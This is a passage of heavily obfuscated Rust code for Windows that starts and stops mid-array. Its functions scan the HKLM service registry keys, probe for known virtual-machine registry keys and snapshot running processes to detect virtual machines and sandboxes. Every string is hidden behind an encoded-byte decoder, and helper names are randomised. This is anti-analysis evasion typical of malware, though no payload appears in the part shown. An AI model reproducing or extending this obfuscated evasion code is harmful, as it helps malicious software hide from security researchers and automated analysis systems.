, 191 , 59 , 254 , 211 , 68 , 12 , 200 , 63 , 119 , 60 , 130 , 107 , 231 , 17 , 148 , 188 , 89 , 224 , 75 , 24 , 60 , 50 , 72 , 112 , 52 , 89 , 208 , 241 , 240 , 129 , 110 , 3 , 160 , 138 , 253 , 0 , 177 , 160 , 24 , 59 , 8 , 210 , 166 , 206 , 134 , 188 , 144 , 74 , 202 , 73 , 178 , 163 , 46 , 13 , 45 , 66 , 56 , 189 , 131 , 153 , 63 , 230 , 216 , 15 , 240 , 121 , 40 , 118 , 207 , 112 , 30 , 69 , 51 , 80 , 88 , 2 , 167 , 171 , 12 , 15 , 56 , 255 , 10] , 7344394076718u64) , decode_bpcz_gftyzfrr (& [144 , 99 , 248 , 225 , 124 , 7 , 141 , 37 , 136 , 241 , 38 , 57 , 232 , 203 , 2 , 103 , 191 , 217 , 240 , 70 , 3 , 136 , 201 , 127 , 21 , 252 , 25 , 150 , 40 , 73 , 55 , 70 , 179 , 235 , 85 , 195 , 248 , 98 , 210 , 107 , 236 , 200 , 101 , 167 , 88 , 47 , 58 , 95 , 64 , 82 , 62 , 19 , 122 , 71 , 92 , 184 , 154 , 222 , 139 , 42 , 188 , 186 , 26 , 102 , 190 , 178 , 188 , 100 , 253 , 140 , 246 , 195 , 82 , 0 , 180 , 93 , 148 , 40 , 140 , 26] , & [91 , 176 , 28 , 97 , 198 , 244 , 168 , 88 , 19 , 115 , 42 , 199 , 15 , 249 , 149 , 2 , 224 , 219 , 212 , 138 , 6 , 254 , 71 , 51 , 45 , 1 , 123 , 226 , 179 , 207 , 67 , 137 , 71 , 241 , 171 , 223 , 120 , 9 , 238 , 194 , 218 , 124 , 176 , 2 , 113 , 62 , 115 , 120 , 48 , 126 , 32 , 127 , 94 , 217 , 189 , 45 , 70 , 1 , 39 , 193 , 193 , 120 , 38 , 190 , 176 , 25 , 92 , 153 , 234 , 207 , 44 , 175 , 198 , 153 , 20 , 140 , 179 , 85 , 120 , 136 , 96 , 199 , 129 , 204 , 114 , 247 , 139 , 39] , 6687264080330u64) ,] ; let mut i = 0 ; loop { let mut subkey_name_buffer : [u16 ; (111 + 145)] = [0 ; (9 + 247)] ; let mut subkey_name_len = subkey_name_buffer . len () as u32 ; if unsafe { RegEnumKeyExW (services_key_handle , i , PWSTR (subkey_name_buffer . as_mut_ptr ()) , & mut subkey_name_len , None , PWSTR (std :: ptr :: null_mut ()) , None , None ,) } . is_err () { break ; } i += 1 ; let subkey_name = String :: from_utf16_lossy (& subkey_name_buffer [.. subkey_name_len as usize]) ; let service_key_path = format ! ("SYSTEM\\CurrentControlSet\\Services\\{}" , subkey_name) ; let mut service_key_handle : HKEY = HKEY (0) ; let service_key_pcwstr = fqgjhfwh (& service_key_path) ; if unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (service_key_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut service_key_handle ,) } . is_ok () { let value_name = fqgjhfwh (& decode_bpcz_gftyzfrr (& [30 , 2 , 21 , 76 , 68 , 155 , 47 , 161 , 200 , 195 , 187 , 33 , 84 , 107 , 173 , 119 , 102 , 80 , 250 , 103 , 242 , 111 , 195 , 138 , 79 , 121 , 213 , 92 , 214 , 179 , 0 , 106 , 194 , 141 , 189 , 94 , 21 , 52 , 84 , 166 , 65 , 117 , 197 , 152 , 185 , 184 , 192 , 206 , 129 , 64 , 131 , 25 , 163 , 221 , 225 , 51 , 27 , 41 , 15 , 224 , 144 , 194 , 78 , 126 , 37 , 18 , 118 , 171 , 34 , 89 , 69 , 127 , 216 , 5 , 51 , 62 , 111 , 142 , 223 , 56 , 101 , 149 , 249 , 33 , 83 , 183 , 195 , 65 , 14 , 5 , 185 , 6 , 81 , 132 , 50 , 246 , 149 , 33 , 192 , 175 , 78 , 72 , 115 , 237 , 173 , 236 , 13 , 75 , 234 , 3 , 214 , 214 , 86 , 21 , 170 , 89 , 231 , 85 , 43 , 121 , 97 , 35 , 217 , 43 , 5 , 103 , 41 , 202] , & [43 , 70 , 34 , 140 , 94 , 194 , 234 , 227 , 14 , 83 , 120 , 184 , 212 , 151 , 77 , 88 , 79 , 53 , 255 , 76 , 174 , 27 , 168 , 72 , 17 , 29 , 130 , 198 , 215 , 18 , 32 , 156 , 217 , 33 , 211 , 132 , 59 , 149 , 40 , 117 , 125 , 129 , 3 , 129 , 158 , 178 , 58 , 56 , 8 , 255 , 143 , 176 , 73 , 114 , 9 , 203 , 240 , 219 , 76 , 181 , 237 , 28 , 148 , 167 , 9 , 27 , 201 , 235 , 167 , 116 , 47 , 222 , 249 , 150 , 47 , 148 , 148 , 166 , 92 , 93 , 162 , 210 , 89 , 177 , 180 , 76 , 235 , 80] , 18412524798833u64)) ; let mut buffer : [u16 ; (32 + 224)] = [0 ; (22 + 234)] ; let mut buffer_size = (buffer . len () * std :: mem :: size_of :: < u16 > ()) as u32 ; if unsafe { RegQueryValueExW (service_key_handle , PCWSTR (value_name . as_ptr ()) , None , None , Some (buffer . as_mut_ptr () as * mut u8) , Some (& mut buffer_size) ,) } . is_ok () { let value = String :: from_utf16_lossy (& buffer [.. buffer_size as usize / 2]) ; for vm_driver in & vm_drivers { if value . contains (& * * vm_driver) { unsafe { let _ = RegCloseKey (service_key_handle) ; let _ = RegCloseKey (services_key_handle) ; } ; return true ; } } } unsafe { let _ = RegCloseKey (service_key_handle) ; } ; } } unsafe { let _ = RegCloseKey (services_key_handle) ; } ; false } fn fqgjhfwh (s : & str) -> Vec < u16 > { OsStr :: new (s) . encode_wide () . chain (std :: iter :: once (0)) . collect () } pub fn check_vm_registry_keys () -> bool { let vm_keys = [decode_bpcz_gftyzfrr (& [203 , 71 , 106 , 63 , 189 , 45 , 181 , 237 , 47 , 159 , 161 , 100 , 72 , 38 , 152 , 125 , 64 , 112 , 254 , 171 , 34 , 174 , 111 , 186 , 154 , 158 , 247 , 99 , 39 , 222 , 13 , 23 , 46 , 92 , 99 , 245 , 22 , 96 , 132 , 27 , 242 , 198 , 234 , 182 , 192 , 113 , 92 , 26 , 142 , 216 , 250 , 54 , 121 , 253 , 235 , 215 , 18 , 215 , 243 , 246 , 211 , 204 , 187 , 171 , 21 , 139 , 196 , 214 , 209 , 142 , 170 , 199 , 197 , 16 , 40 , 70 , 85 , 229 , 75 , 115 , 154 , 94 , 83 , 18 , 176 , 222 , 111 , 38 , 189 , 75 , 101 , 168 , 41 , 174 , 227 , 57 , 141 , 39 , 194 , 189 , 72 , 18 , 180 , 146 , 110 , 246 , 46 , 254 , 218 , 79 , 52 , 210 , 232 , 14 , 74 , 132 , 75 , 71 , 214 , 173 , 124 , 221 , 11 , 174 , 131 , 191 , 38 , 191 , 45 , 146 , 214 , 237 , 227 , 68 , 240 , 176 , 184 , 84 , 146 , 66 , 159 , 123 , 239 , 197 , 14 , 156 , 226 , 87 , 233 , 5 , 9 , 128 , 136 , 83 , 8 , 22 , 7 , 10 , 152 , 127 , 34 , 218 , 27 , 119 , 121 , 176 , 196 , 220 , 73 , 59 , 239 , 80 , 33 , 157 , 93 , 43 , 77 , 45 , 203 , 138 , 83 , 177 , 2 , 30 , 114 , 58 , 33 , 2 , 194 , 43 , 53 , 185 , 139 , 104 , 229 , 193 , 95 , 65 , 51 , 142 , 164 , 29 , 168 , 129 , 80 , 126 , 98 , 81 , 180 , 229 , 130 , 56 , 114 , 196 , 6 , 84 , 13 , 78 , 210 , 217 , 207 , 229 , 11 , 193 , 28 , 22 , 200 , 89 , 184 , 4 , 1 , 159 , 66 , 120 , 144 , 130 , 98 , 34 , 64 , 47 , 86 , 96 , 151 , 5 , 120 , 170 , 125 , 26 , 141 , 1 , 55 , 144 , 129 , 151 , 121 , 35 , 77 , 69 , 59 , 246 , 236 , 219 , 247 , 126 , 62 , 205 , 9 , 231 , 39 , 170 , 21 , 66 , 218 , 231 , 190 , 100 , 207 , 181 , 131 , 183 , 188 , 60 , 184 , 223 , 66 , 162 , 153 , 162 , 115 , 53 , 33 , 233 , 81 , 88 , 91 , 31 , 222 , 30 , 116 , 28 , 45 , 77 , 1 , 247 , 149 , 237 , 186 , 35 , 186 , 221 , 58 , 28 , 222 , 123 , 11 , 201 , 1 , 169 , 76 , 199 , 2 , 141 , 20 , 62 , 252 , 36 , 26 , 2 , 251 , 225 , 227 , 170 , 107 , 86 , 0 , 83 , 15 , 74 , 168 , 157 , 144 , 164 , 230 , 235 , 218 , 7 , 51 , 26 , 51 , 225 , 236 , 57 , 35 , 100 , 158 , 251 , 243 , 235 , 177 , 216 , 203 , 45 , 57 , 146 , 40 , 218 , 206 , 179 , 153 , 31 , 250 , 39 , 158 , 1 , 121 , 153 , 0 , 237 , 235 , 81 , 220 , 134 , 153 , 157 , 100 , 157 , 192 , 143 , 243 , 83 , 75 , 183 , 100 , 240 , 38 , 179 , 77 , 201 , 241 , 131] , & [142 , 216 , 150 , 237 , 205 , 248 , 127 , 63 , 12 , 87 , 163 , 212 , 254 , 254 , 156 , 76 , 173 , 211 , 253 , 213 , 238 , 85 , 179 , 144 , 150 , 201 , 205 , 209 , 247 , 3 , 250 , 254 , 181 , 147 , 39 , 146 , 168 , 39 , 167 , 242 , 228 , 96 , 227 , 85 , 129 , 218 , 20 , 92 , 115 , 247 , 200 , 16 , 254 , 48 , 244 , 72 , 248 , 30 , 152 , 138 , 99 , 126 , 154 , 70 , 196 , 47 , 13 , 34 , 46 , 22 , 38 , 226 , 110 , 114 , 37 , 1 , 171 , 62 , 10 , 171 , 73 , 135 , 37 , 170 , 142 , 23 , 163 , 115] , 213266601085837u64) , decode_bpcz_gftyzfrr (& [162 , 121 , 138 , 248 , 199 , 21 , 100 , 123 , 193 , 203 , 197 , 141 , 75 , 68 , 126 , 46 , 59 , 193 , 49 , 244 , 163 , 178 , 123 , 98 , 111 , 58 , 229 , 109 , 123 , 114 , 42 , 222 , 218 , 16 , 129 , 38 , 52 , 28 , 249 , 222 , 109 , 187 , 91 , 74 , 157 , 237 , 41 , 207 , 212 , 34 , 63 , 133 , 117 , 33 , 204 , 92 , 111 , 202 , 170 , 108 , 184 , 208 , 146 , 13 , 73 , 233 , 228 , 35 , 148 , 106 , 168 , 243 , 245 , 203 , 241 , 174 , 5 , 42 , 108 , 106 , 71 , 26 , 105 , 196 , 124 , 191 , 176 , 15 , 214 , 9 , 231 , 249 , 243 , 0 , 29 , 78 , 119 , 242 , 130 , 39 , 16 , 109 , 242 , 165 , 89 , 147 , 86 , 88 , 21 , 74 , 40 , 149 , 134 , 91 , 249 , 44 , 183 , 132 , 99 , 16 , 175 , 146 , 76 , 128 , 237 , 239 , 49 , 248 , 52 , 195 , 203 , 56 , 98 , 35 , 171 , 233 , 210 , 138 , 125 , 105 , 79 , 226 , 9 , 67 , 181 , 231 , 225 , 60 , 68 , 93 , 87 , 115 , 1 , 86 , 126 , 119 , 236 , 58 , 43 , 106 , 96 , 57 , 37 , 201 , 122 , 188 , 250 , 202 , 87 , 114 , 127 , 39 , 147 , 108 , 107 , 219 , 240 , 92 , 184 , 72 , 92 , 18 , 179 , 121 , 18 , 169 , 231 , 80 , 80 , 118 , 207 , 11 , 208 , 21 , 123 , 40 , 88 , 219 , 147 , 82 , 199 , 55 , 110 , 161 , 241 , 15 , 80 , 80 , 45 , 198 , 236 , 57 , 9 , 155 , 115 , 87 , 126 , 68 , 145 , 22 , 214 , 219 , 30 , 164 , 175 , 215 , 73 , 53 , 181 , 250 , 95 , 27 , 28 , 149 , 131 , 72 , 85 , 139 , 239 , 142 , 171 , 202 , 0 , 168 , 64 , 174 , 30 , 215 , 249 , 48 , 115 , 248 , 251 , 83 , 157 , 116 , 199 , 80 , 190 , 94 , 25 , 58 , 153 , 244 , 53 , 245 , 90 , 234 , 115 , 241 , 43 , 173 , 188 , 80 , 139 , 252 , 112 , 233 , 153 , 229 , 204 , 55 , 188 , 183 , 245 , 124 , 144 , 84 , 8 , 136 , 217 , 252 , 19 , 208 , 37 , 26 , 225 , 57 , 192 , 79 , 114 , 226 , 233 , 142 , 186 , 102 , 145 , 118 , 206 , 104 , 200 , 86 , 109 , 47 , 229 , 51 , 83 , 83 , 132 , 49 , 63 , 254 , 82 , 94 , 2 , 21 , 37 , 218 , 61 , 186 , 144 , 74 , 226 , 238 , 173 , 138 , 34 , 30 , 232 , 171 , 15 , 76 , 220 , 117 , 228 , 62 , 123 , 29 , 104 , 15 , 16 , 187 , 107 , 34 , 101 , 144 , 195 , 255 , 163 , 156 , 29 , 79 , 139 , 170 , 55 , 183 , 231 , 111 , 155 , 246 , 227 , 49 , 167 , 63 , 221 , 179 , 70 , 96 , 74 , 212 , 61 , 170 , 5 , 223 , 3 , 89 , 206 , 191 , 4 , 225 , 40 , 179 , 57 , 136 , 141 , 203 , 121 , 220 , 221 , 158 , 165 , 126 , 75 , 99 , 95 , 237 , 210 , 101 , 138 , 17 , 198 , 112 , 81 , 226 , 213 , 202 , 236 , 146 , 78 , 242 , 114 , 192 , 68 , 52 , 0 , 140 , 201 , 5 , 152 , 68 , 127 , 172 , 115 , 127 , 138 , 164 , 175 , 160 , 212 , 217 , 213 , 110 , 248 , 12 , 221 , 74 , 195 , 89 , 98 , 86 , 98 , 180 , 240 , 44 , 137 , 224 , 133 , 83 , 30 , 183 , 74 , 241 , 193 , 32 , 63 , 234 , 20 , 86 , 165 , 11 , 82 , 206 , 118 , 180 , 64 , 53 , 106 , 81 , 103 , 169 , 84 , 211 , 245 , 59 , 150 , 34 , 190 , 92 , 255 , 242 , 0 , 230 , 116 , 75 , 193 , 55 , 138 , 29 , 23 , 166 , 185 , 221 , 250 , 12 , 32 , 15 , 254 , 245 , 148 , 84 , 47 , 6] , & [157 , 42 , 100 , 54 , 49 , 139 , 223 , 45 , 56 , 110 , 239 , 121 , 66 , 0 , 238 , 227 , 246 , 250 , 159 , 27 , 175 , 31 , 255 , 82 , 171 , 192 , 178 , 98 , 217 , 32 , 74 , 92 , 198 , 24 , 172 , 181 , 213 , 18 , 88 , 13 , 197 , 91 , 3 , 239 , 207 , 0 , 118 , 200 , 3 , 86 , 202 , 200 , 187 , 187 , 107 , 191 , 101 , 157 , 202 , 11 , 189 , 106 , 243 , 123 , 115 , 247 , 137 , 194 , 213 , 14 , 200 , 161 , 35 , 122 , 88 , 160 , 63 , 208 , 81 , 32 , 215 , 142 , 26 , 194 , 183 , 46 , 199 , 133] , 112356344467637u64) , decode_bpcz_gftyzfrr (& [25 , 121 , 136 , 6 , 196 , 212 , 133 , 218 , 26 , 13 , 105 , 118 , 51 , 54 , 250 , 54 , 165 , 74 , 200 , 67 , 53 , 182 , 227 , 205 , 243 , 46 , 136 , 49 , 241 , 9 , 59 , 168 , 93 , 154 , 90 , 163 , 13 , 95 , 21 , 23 , 175 , 214 , 112 , 229 , 81 , 86 , 114 , 175 , 80 , 81 , 131 , 145 , 68 , 134 , 124 , 18 , 173 , 95 , 239 , 23 , 237 , 27 , 124 , 132 , 65 , 121 , 54 , 77 , 197 , 222 , 204 , 75 , 95 , 81 , 9 , 23 , 168 , 212 , 64 , 20 , 61 , 117 , 157 , 213 , 98 , 9 , 205 , 15 , 14 , 48 , 71 , 35 , 26 , 177 , 16 , 55 , 202 , 158 , 30 , 114 , 185 , 144 , 78 , 21 , 204 , 60 , 189 , 148 , 180 , 133 , 118 , 0 , 12 , 6 , 13 , 81 , 20 , 251 , 183 , 48 , 66 , 227 , 24 , 43 , 188 , 224 , 45 , 156 , 180 , 139 , 150 , 37 , 200 , 129 , 167 , 216 , 92 , 124 , 15 , 112 , 231 , 127 , 12 , 55 , 51 , 69 , 149 , 193 , 17 , 29 , 214 , 106 , 144 , 112 , 214 , 243 , 91 , 166 , 49 , 218 , 33 , 227 , 54 , 196 , 228 , 31 , 75 , 29 , 31 , 222 , 241 , 60 , 248 , 210 , 28 , 35 , 116 , 40 , 251 , 98 , 58 , 50 , 190 , 110 , 123 , 54 , 219 , 181 , 10 , 147 , 184 , 63 , 60 , 254 , 112 , 168 , 150 , 115 , 6 , 98 , 94 , 167 , 198 , 68 , 102 , 223 , 149 , 156 , 25 , 102 , 98 , 15 , 189 , 134 , 195 , 109 , 8 , 0 , 117 , 75 , 25 , 39 , 93 , 217 , 242 , 218 , 214 , 126 , 124 , 24 , 43 , 94 , 71 , 129 , 49 , 52 , 93 , 76 , 177 , 36 , 137 , 61 , 39 , 247 , 110 , 50 , 70 , 177 , 48 , 188 , 234 , 88 , 105 , 78 , 195 , 112 , 171 , 154 , 54 , 120 , 54 , 19 , 107 , 7 , 28 , 8 , 102 , 209 , 39 , 81 , 151 , 210 , 120 , 58 , 157 , 237 , 71 , 76 , 168 , 44 , 110 , 248 , 167 , 188 , 223 , 223 , 13 , 213 , 228 , 139 , 244 , 92 , 145 , 8 , 146 , 171 , 224 , 59 , 37 , 175 , 126 , 215 , 157 , 132 , 3 , 136 , 158 , 57 , 160 , 108 , 30 , 171 , 94 , 233 , 79 , 92 , 171 , 246 , 25 , 162 , 190 , 204 , 49 , 202 , 182 , 15 , 164 , 241 , 79 , 105 , 91 , 47 , 64 , 118 , 66 , 94 , 240 , 39 , 33 , 123 , 83 , 140 , 90 , 116 , 3 , 169 , 115 , 224 , 98 , 202 , 242 , 34 , 81 , 3 , 107 , 176 , 163 , 47 , 204 , 99 , 14 , 63 , 131 , 215 , 93 , 59 , 155 , 174 , 77 , 200 , 137 , 231 , 105 , 121 , 3 , 247 , 121 , 211 , 9 , 152 , 177 , 250 , 194 , 174 , 42 , 37 , 222 , 60 , 205 , 171 , 227 , 207 , 59 , 173 , 225 , 0 , 30 , 173 , 173 , 248 , 193 , 55 , 218 , 193 , 147 , 87 , 193 , 142 , 145 , 48 , 174 , 75 , 113 , 173 , 183 , 164 , 219 , 164 , 183 , 61 , 169 , 81 , 181 , 225 , 251 , 1 , 216 , 188 , 50 , 251 , 170 , 122 , 136 , 54 , 204 , 32 , 29 , 240 , 156 , 67 , 44 , 131 , 139 , 98 , 123 , 22 , 4 , 133 , 60 , 104 , 204 , 194 , 209 , 157 , 44 , 151 , 46 , 179 , 206 , 152 , 255 , 242 , 103 , 236 , 109 , 18 , 231 , 56 , 84 , 64 , 87 , 40 , 161 , 251 , 32 , 96 , 190 , 110 , 16 , 123 , 211 , 174 , 116 , 62 , 157 , 197 , 212 , 64 , 226 , 86 , 4 , 112 , 101 , 107 , 247 , 166 , 229 , 199 , 148 , 169 , 115 , 33 , 251 , 245 , 226 , 129 , 19 , 240 , 113 , 167 , 194 , 147] , & [201 , 114 , 3 , 13 , 87 , 234 , 173 , 95 , 57 , 70 , 233 , 191 , 87 , 110 , 0 , 14 , 200 , 175 , 156 , 186 , 212 , 181 , 135 , 137 , 92 , 192 , 249 , 23 , 46 , 149 , 111 , 44 , 233 , 164 , 141 , 113 , 105 , 3 , 83 , 96 , 247 , 163 , 96 , 204 , 176 , 21 , 21 , 53 , 117 , 164 , 111 , 66 , 204 , 53 , 122 , 44 , 53 , 104 , 217 , 185 , 232 , 104 , 204 , 214 , 13 , 23 , 152 , 3 , 33 , 74 , 222 , 158 , 11 , 194 , 78 , 34 , 188 , 124 , 252 , 143 , 130 , 116 , 234 , 198 , 228 , 110 , 58 , 10] , 112523848192182u64) , decode_bpcz_gftyzfrr (& [116 , 67 , 122 , 1 , 205 , 239 , 91 , 17 , 245 , 218 , 98 , 237 , 47 , 64 , 187 , 99 , 202 , 152 , 73 , 150 , 70 , 172 , 160 , 219 , 190 , 245 , 37 , 147 , 157 , 200 , 216 , 91 , 8 , 182 , 18 , 237 , 127 , 229 , 249 , 109 , 78 , 40 , 26 , 47 , 155 , 232 , 213 , 93 , 93 , 178 , 172 , 72 , 110 , 147 , 155 , 118 , 198 , 105 , 82 , 77 , 228 , 157 , 16 , 24 , 222 , 159 , 164 , 75 , 167 , 151 , 43 , 9 , 252 , 98 , 200 , 82 , 236 , 51 , 98 , 1 , 28 , 119 , 234 , 27 , 206 , 81 , 56 , 15 , 37 , 156 , 66 , 96 , 51 , 247 , 152 , 250 , 246 , 148 , 119 , 187 , 191 , 60 , 204 , 226 , 126 , 64 , 144 , 50 , 249 , 80 , 26 , 166 , 64 , 173 , 10 , 203 , 68 , 134 , 224 , 129 , 230 , 223 , 211 , 144 , 98 , 201 , 182 , 6 , 181 , 9 , 7 , 172 , 41 , 225 , 156 , 162 , 38 , 118 , 88 , 236 , 118 , 43 , 218 , 233 , 148 , 10 , 175 , 206 , 116 , 55 , 135 , 176 , 193 , 18 , 82 , 146 , 124 , 25 , 179 , 172 , 56 , 31 , 135 , 2 , 218 , 8 , 67 , 104 , 136 , 195 , 39 , 245 , 248 , 214 , 243 , 242 , 116 , 100 , 157 , 89 , 194 , 254 , 100 , 138 , 2 , 11 , 103 , 68 , 179 , 10 , 92 , 214 , 255 , 0 , 5 , 3 , 126 , 149 , 132 , 97 , 36 , 12 , 148 , 86 , 68 , 98 , 111 , 26 , 22 , 58 , 200 , 138 , 158 , 234 , 82 , 77 , 124 , 204 , 165 , 80 , 123 , 119 , 64 , 177 , 176 , 154 , 187 , 27 , 72 , 3 , 166 , 127 , 182 , 249 , 200 , 41 , 205 , 20 , 118 , 105 , 237 , 92 , 38 , 178 , 223 , 233 , 63 , 108 , 96 , 22 , 73 , 3 , 200 , 64 , 252 , 184 , 135 , 162 , 248 , 12 , 154 , 244 , 149 , 75 , 190 , 167 , 250 , 251 , 149 , 73 , 204 , 78 , 228 , 120 , 94 , 167 , 119 , 30 , 167 , 138 , 139 , 174 , 6 , 69 , 73 , 99 , 240 , 92 , 177 , 3 , 87 , 253 , 35 , 52 , 245 , 55 , 106 , 77 , 238 , 221 , 207 , 36 , 203 , 141 , 79 , 155 , 234 , 227 , 19 , 95 , 185 , 141 , 66 , 237 , 108 , 161 , 64 , 115 , 49 , 241 , 91 , 107 , 87 , 186 , 160 , 41 , 252 , 22 , 70 , 154 , 182 , 213 , 84 , 161 , 34 , 134 , 37 , 118 , 144 , 242 , 200 , 42 , 93 , 140 , 246 , 37 , 204 , 92 , 87 , 149 , 130 , 115 , 78 , 246 , 171 , 186 , 35 , 50 , 113 , 124 , 106 , 198 , 144 , 205 , 46 , 201 , 253 , 188 , 231 , 227 , 191 , 254 , 95 , 177 , 101 , 207 , 204 , 136 , 177 , 43 , 80 , 235 , 14 , 130 , 129 , 37 , 209 , 44 , 148 , 53 , 93 , 251 , 133 , 130 , 57 , 74 , 50 , 207 , 250 , 75 , 205 , 82 , 200 , 149 , 205 , 166 , 224 , 174 , 171 , 232 , 148 , 45 , 110 , 152 , 56 , 13 , 181 , 104 , 103 , 157 , 150 , 211 , 253 , 56 , 218 , 4 , 97 , 56 , 35 , 82 , 47 , 20 , 159 , 224 , 120 , 26 , 34 , 41 , 176 , 71 , 171 , 4 , 239 , 239 , 132 , 163 , 234 , 2 , 7 , 22 , 207 , 76 , 133 , 63 , 38 , 91 , 15 , 149 , 186 , 248 , 107 , 92 , 220 , 63] , & [16 , 105 , 230 , 212 , 126 , 176 , 82 , 195 , 150 , 203 , 150 , 44 , 212 , 174 , 94 , 142 , 46 , 158 , 114 , 245 , 61 , 10 , 69 , 30 , 2 , 165 , 171 , 246 , 189 , 190 , 17 , 57 , 13 , 32 , 145 , 76 , 135 , 55 , 237 , 159 , 85 , 3 , 143 , 79 , 37 , 100 , 210 , 134 , 157 , 214 , 209 , 119 , 12 , 236 , 55 , 223 , 68 , 242 , 21 , 193 , 221 , 56 , 10 , 111 , 88 , 203 , 32 , 58 , 161 , 52 , 23 , 95 , 37 , 50 , 218 , 178 , 108 , 159 , 197 , 136 , 169 , 173 , 39 , 139 , 130 , 72 , 106 , 119] , 58639188496198u64) , decode_bpcz_gftyzfrr (& [127 , 85 , 129 , 194 , 91 , 161 , 131 , 198 , 55 , 245 , 6 , 50 , 91 , 213 , 33 , 59 , 122 , 127 , 111 , 74 , 184 , 147 , 18 , 203 , 231 , 210 , 153 , 252 , 60 , 81 , 113 , 206 , 223 , 239 , 191 , 211 , 169 , 13 , 93 , 231 , 6 , 30 , 233 , 156 , 216 , 246 , 252 , 235 , 239 , 18 , 185 , 204 , 61 , 181 , 218 , 9 , 17 , 115 , 20 , 240 , 12 , 36 , 21 , 99 , 164 , 5 , 90 , 241 , 17 , 97 , 18 , 39 , 118 , 114 , 90 , 138 , 33 , 255 , 17 , 89 , 165 , 111 , 21 , 129 , 11 , 202 , 152 , 206 , 246 , 159 , 67 , 48 , 53 , 208 , 100 , 52 , 193 , 58 , 37 , 106 , 35 , 95 , 173 , 214 , 247 , 115 , 78 , 83 , 42 , 182 , 61 , 128 , 117 , 26 , 118 , 41 , 222 , 81 , 236 , 117 , 248 , 250 , 190 , 217 , 2 , 230 , 75 , 147 , 154 , 149 , 35 , 38 , 225 , 41 , 10 , 138 , 101 , 29 , 127 , 191 , 83 , 178 , 71 , 0 , 50 , 204 , 135 , 27 , 168 , 134 , 81 , 118 , 36 , 167 , 149 , 23 , 46 , 229 , 37 , 246 , 206 , 113 , 90 , 67 , 66 , 1 , 232 , 189 , 202 , 63 , 56 , 201 , 154 , 224 , 163 , 205 , 63 , 35 , 190 , 79 , 250 , 46 , 37 , 3 , 19 , 199 , 190 , 205 , 69 , 66 , 137 , 5 , 248 , 172 , 158 , 49 , 22 , 16 , 114 , 236 , 40 , 1 , 64 , 179 , 22 , 123 , 29 , 88 , 196 , 69 , 28 , 67 , 144 , 171 , 198 , 176 , 186 , 207 , 37 , 173 , 233 , 15 , 99 , 249 , 98 , 37 , 112 , 216 , 30 , 155 , 126 , 81 , 201 , 34 , 196 , 185 , 100 , 37 , 43 , 30 , 224 , 92 , 124 , 34 , 218 , 110 , 116 , 58 , 51 , 239 , 113 , 113 , 81 , 102 , 28 , 187 , 235 , 243 , 89 , 154 , 74 , 67 , 223 , 29 , 142 , 250 , 239 , 102 , 59 , 186 , 174 , 49 , 52 , 184 , 127 , 67 , 204 , 166 , 16 , 23 , 230 , 135 , 139 , 239 , 9 , 19 , 153 , 54 , 2 , 167 , 6 , 30 , 20 , 225 , 117 , 134 , 50 , 43 , 201 , 172 , 249 , 138 , 139 , 109 , 25 , 107 , 139 , 136 , 1 , 219 , 171 , 223 , 187 , 84 , 216 , 56 , 49 , 222 , 31 , 36 , 168 , 157 , 37 , 205 , 18 , 92 , 138 , 160 , 135 , 57 , 111 , 134 , 20 , 168 , 140 , 134 , 48 , 56 , 16 , 32 , 67 , 228 , 180 , 61 , 245 , 22 , 168 , 11 , 134 , 146 , 142 , 119 , 186 , 223 , 41 , 205 , 216 , 98 , 200 , 151 , 217 , 89 , 29 , 239 , 205 , 221 , 33 , 41 , 222 , 133 , 248 , 179 , 233 , 111 , 28 , 106 , 216 , 5 , 63 , 248 , 233 , 58 , 136 , 70 , 58 , 50 , 94 , 126 , 80 , 119 , 247 , 244 , 115 , 182 , 40 , 142 , 42 , 72 , 234 , 181 , 98 , 101 , 97 , 172 , 117 , 63 , 214 , 174 , 238 , 57 , 132 , 159 , 145 , 216 , 12 , 65 , 174 , 222 , 98 , 67 , 201 , 159 , 61 , 132 , 125 , 16 , 193 , 124 , 43 , 160 , 238 , 41 , 117 , 144 , 240 , 159 , 169 , 206 , 10 , 163 , 185 , 28 , 238 , 142 , 231 , 196 , 105 , 57 , 62 , 145 , 198 , 215 , 195 , 40 , 191 , 23 , 54 , 86 , 65 , 20 , 174 , 90 , 124 , 226 , 129 , 189 , 9 , 6 , 131 , 16 , 67 , 147 , 253 , 209 , 222 , 148 , 251 , 93 , 90 , 199 , 16 , 198 , 141 , 9 , 16 , 49 , 54 , 125 , 223 , 16 , 137 , 51 , 161 , 239 , 98 , 29 , 38 , 145 , 24 , 27 , 237 , 52 , 31 , 49 , 134 , 22 , 217 , 4 , 127 , 16 , 69 , 255] , & [236 , 242 , 18 , 178 , 238 , 230 , 96 , 184 , 92 , 42 , 111 , 123 , 168 , 243 , 145 , 252 , 26 , 0 , 247 , 250 , 31 , 203 , 237 , 96 , 48 , 184 , 200 , 146 , 122 , 79 , 42 , 10 , 154 , 0 , 194 , 230 , 147 , 29 , 47 , 49 , 103 , 128 , 215 , 67 , 151 , 151 , 179 , 124 , 185 , 55 , 30 , 159 , 108 , 122 , 210 , 212 , 224 , 71 , 33 , 210 , 5 , 47 , 221 , 112 , 252 , 120 , 182 , 29 , 7 , 233 , 107 , 164 , 211 , 173 , 149 , 62 , 14 , 200 , 107 , 146 , 163 , 58 , 18 , 243 , 38 , 56 , 236 , 172] , 112317689761956u64) ,] ; for key_path in & vm_keys { let subkey_pcwstr = fqgjhfwh (& * * key_path) ; let mut key_handle : HKEY = HKEY (0) ; let result = unsafe { RegOpenKeyExW (HKEY_LOCAL_MACHINE , PCWSTR (subkey_pcwstr . as_ptr ()) , 0 , KEY_READ , & mut key_handle ,) } ; if result . is_ok () { unsafe { let _ = RegCloseKey (key_handle) ; } ; return true ; } } false } pub fn check_vm_processes () -> bool { let snapshot_handle = match unsafe { CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS , 0) } { Ok (handle) => handle , Err (_) => return false , } ; if snapshot_handle . is_invalid () { return false ; } let mut process_entry : PROCESSENTRY32W = unsafe { std :: mem :: zeroed () } ; process_entry . dwSize = std :: mem :: size_of :: < PROCESSENTRY32W > () as u32 ; if unsafe { Process32FirstW (snapshot_handle , & mut process_entry) } . is_err () { unsafe { let _ = CloseHandle (snapshot_handle) ; } ; return false ; } let vm_processes = [decode_bpcz_gftyzfrr (& [57 , 38 , 231 , 223 , 204 , 189 , 193 , 114 , 159 , 230 , 41 , 30 , 220 , 196 , 196 , 66 , 128 , 122 , 47 , 131 , 232 , 209 , 77 , 16 , 66 , 218 , 85 , 116 , 7 , 114 , 132 , 154 , 171 , 180 , 162 , 138 , 62 , 134 , 50 , 28 , 34 , 199 